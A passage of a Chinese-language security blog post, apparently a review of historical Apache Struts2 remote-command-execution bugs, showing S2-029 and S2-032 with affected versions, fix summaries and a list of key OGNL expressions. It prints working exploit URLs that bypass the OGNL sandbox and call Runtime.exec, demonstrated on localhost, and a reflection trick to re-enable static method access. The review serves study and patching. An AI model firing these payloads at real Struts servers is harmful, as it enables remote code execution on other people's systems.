+<p>官方链接：<a href="https://struts.apache.org/docs/s2-029.html" target="_blank" rel="noopener">https://struts.apache.org/docs/s2-029.html</a></p>
+<p>影响版本：Struts 2.0.0 - Struts 2.3.16</p>
+<p>修复摘要：限制传入标签属性的值，对其进行合规的正则验证</p>
+</blockquote>
+<p>简单的说就是当开发者在模版中使用了类似如下的标签写法时，后端 Struts2 处理时会导致二次 OGNL 表达式执行的情况：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;s:textfield name=&quot;%&#123;message&#125;&quot;&gt;&lt;/s:textfield&gt;</span><br></pre></td></tr></table></figure>
+<p>这里需要注意的是，仅当只有 <code>name</code> 属性这样写的情况下才能触发 OGNL 表达式执行，并且该标签中不能显示写有 <code>value</code> 属性。详细分析可参考天融信阿尔法实验室的张萌所写的<a href="http://blog.topsec.com.cn/ad_lab/struts2漏洞s2-029分析/" target="_blank" rel="noopener">《struts2漏洞s2-029分析》</a></p>
+<p>到 S2-029 这里是，Struts2 已经增加了相当多的安全检测了，所以想要直接执行命令还需要通过修改这些安全参数来绕过最后的执行检测，具体的安全参数版本差异同样可参考上面的详细分析文章。</p>
+<p>下面测试环境使用的是 <code>Struts 2.3.24.1</code>：</p>
+<pre><code>http://localhost:8080/S2-029/default.action?message=(%23_memberAccess[&apos;allowPrivateAccess&apos;]=true,%23_memberAccess[&apos;allowProtectedAccess&apos;]=true,%23_memberAccess[&apos;excludedPackageNamePatterns&apos;]=%23_memberAccess[&apos;acceptProperties&apos;],%23_memberAccess[&apos;excludedClasses&apos;]=%23_memberAccess[&apos;acceptProperties&apos;],%23_memberAccess[&apos;allowPackageProtectedAccess&apos;]=true,%23_memberAccess[&apos;allowStaticMethodAccess&apos;]=true,@java.lang.Runtime@getRuntime().exec(&apos;open /Applications/Calculator.app&apos;))
+</code></pre><p><img src="/images/articles/2016-05-06-review-struts2-remote-command-execution-vulnerabilities/12.png" alt=""></p>
+<p>（前面提到在 S2-015 Struts 2.3.14.2 中已经删除了 <code>setAllowStaticMethodAccess</code> 方法导致无法直接赋值，但是在该测试环境中却又可以直接对 <code>_memberAccess[&#39;allowStaticMethodAccess&#39;]</code> 进行赋值了，表示有点疑惑，希望有明白的同学告知我一下）</p>
+<h3 id="S2-032"><a href="#S2-032" class="headerlink" title="S2-032"></a>S2-032</h3><blockquote>
+<p>官方链接：<a href="https://struts.apache.org/docs/s2-032.html" target="_blank" rel="noopener">https://struts.apache.org/docs/s2-032.html</a></p>
+<p>影响版本：Struts 2.3.20 - Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)</p>
+<p>修复摘要：过滤通过 method: 传入的 action 名称，限制其字符范围 protected Pattern allowedActionNames = Pattern.compile(“[a-zA-Z0-9._!/\-]*”);</p>
+</blockquote>
+<p>在配置了 Struts2 DMI 为 True 的情况下，可以使用 <code>method:&lt;name&gt;</code> Action 前缀去调用声明为 public 的函数，DMI 的相关使用方法可参考官方介绍（<a href="https://struts.apache.org/docs/action-configuration.html#ActionConfiguration-DynamicMethodInvocation" target="_blank" rel="noopener">Dynamic Method Invocation</a>），这个 DMI 的调用特性其实一直存在，只不过在低版本中 Strtus2 不会对 <code>name</code> 方法值做 OGNL 计算，而在高版本中会，代码详情可参考阿尔法实验室的报告 - <a href="http://blog.topsec.com.cn/ad_lab/apache-structs2-s2-032%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%E5%8F%8A%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E8%84%9A%E6%9C%AC/" target="_blank" rel="noopener">《Apache Struts2 s2-032技术分析及漏洞检测脚本》</a></p>
+<p>要成功利用必须要开 DMI 才可以：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">"struts.enable.DynamicMethodInvocation"</span> <span class="attr">value</span>=<span class="string">"true"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+<p>找到目标应用有效的 Action 例如 <code>index.action</code>，那么直接使用 DMI 在 <code>method:</code> 后面带上需要执行 OGNL 表达式即可（注意转义）：</p>
+<pre><code>http://localhost:8080/S2-032/index.action?method:%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%2C%23f%3D@java.lang.Runtime@getRuntime%28%29.exec%28%23parameters.cmd%5B0%5D%29%2C%23f.close&amp;cmd=open%20%2fApplications%2fCalculator.app
+</code></pre><p>这里需要注意的是后端会获取 <code>name</code> 值后拼接 <code>&quot;()&quot;</code> 形成 <code>name()</code> 然后再去执行 OGNL 表达式。</p>
+<p>（在测试的时候，对比了前后几个版本的 Payload，发现这里并不用去修改什么安全参数就能够执行命令了，我表示对此有点不解。并且在公开的 PoC 中出现了 <a href="mailto:`#_memberAccess=@ognl.OgnlContext" target="_blank" rel="noopener">`#_memberAccess=@ognl.OgnlContext</a>@DEFAULT_MEMBER_ACCESS` 这个表达式，如果不附上会因为字符检查而执行失败，这一点是为了绕沙盒，但具体代码细节还是不太清楚）</p>
+<h3 id="比较关键的-OGNL-表达式"><a href="#比较关键的-OGNL-表达式" class="headerlink" title="比较关键的 OGNL 表达式"></a>比较关键的 OGNL 表达式</h3><p>获取当前请求参数值（e.g. <code>http://www.example.com/index.action?a=222&amp;b=333</code>）：</p>
+<pre><code>#parameters.a[0]  // a = 222
+</code></pre><p>获取当前 Response 对象，用于输出字符串到当前访问页面：</p>
+<pre><code>#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(&quot;HelloWorld!&quot;),#response.flush(),#response.close()
+</code></pre><p>利用 Java 反射机制修改 <code>#_memberAccess[&#39;allowStaticMethodAccess&#39;]</code>：</p>
+<pre><code>#context[&apos;xwork.MethodAccessor.denyMethodExecution&apos;]=false,#m=#_memberAccess.getClass().getDeclaredField(&apos;allowStaticMethodAccess&apos;),#m.setAccessible(true),#m.set(#_memberAccess,true)
+</code></pre><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
+<li><a href="http://www.cnblogs.com/LittleHann/p/4606891.html" target="_blank" rel="noopener">http://www.cnblogs.com/LittleHann/p/4606891.html</a></li>
+<li><a href="http://www.pwntester.com/blog/2014/01/21/struts-2-devmode-an-ognl-backdoor/" target="_blank" rel="noopener">http://www.pwntester.com/blog/2014/01/21/struts-2-devmode-an-ognl-backdoor/</a></li>
+<li><a href="http://drops.wooyun.org/papers/902" target="_blank" rel="noopener">http://drops.wooyun.org/papers/902</a></li>
+<li><a href="http://blog.topsec.com.cn/ad_lab/apache-structs2-s2-032技术分析及漏洞检测脚本/" target="_blank" rel="noopener">http://blog.topsec.com.cn/ad_lab/apache-structs2-s2-032技术分析及漏洞检测脚本/</a></li>
+</ul>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="http://github.com/RickGray">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#S2-001"><span class="toc-number">1.</span> <span class="toc-text">S2-001</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#S2-007"><span class="toc-number">2.</span> <span class="toc-text">S2-007</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#S2-008"><span class="toc-number">3.</span> <span class="toc-text">S2-008</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#S2-012"><span class="toc-number">4.</span> <span class="toc-text">S2-012</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#S2-013-S2-014"><span class="toc-number">5.</span> <span class="toc-text">S2-013 | S2-014</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#S2-015"><span class="toc-number">6.</span> <span class="toc-text">S2-015</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#S2-016"><span class="toc-number">7.</span> <span class="toc-text">S2-016</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#S2-029"><span class="toc-number">8.</span> <span class="toc-text">S2-029</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#S2-032"><span class="toc-number">9.</span> <span class="toc-text">S2-032</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#比较关键的-OGNL-表达式"><span class="toc-number">10.</span> <span class="toc-text">比较关键的 OGNL 表达式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考"><span class="toc-number">11.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities/&text=Struts2 历史 RCE 漏洞回顾不完全系列"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities/&title=Struts2 历史 RCE 漏洞回顾不完全系列"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities/&is_video=false&description=Struts2 历史 RCE 漏洞回顾不完全系列"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Struts2 历史 RCE 漏洞回顾不完全系列&body=Check out this article: http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities/&title=Struts2 历史 RCE 漏洞回顾不完全系列"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities/&title=Struts2 历史 RCE 漏洞回顾不完全系列"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities/&title=Struts2 历史 RCE 漏洞回顾不完全系列"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities/&title=Struts2 历史 RCE 漏洞回顾不完全系列"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities/&name=Struts2 历史 RCE 漏洞回顾不完全系列&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 RickGray
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="http://github.com/RickGray">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
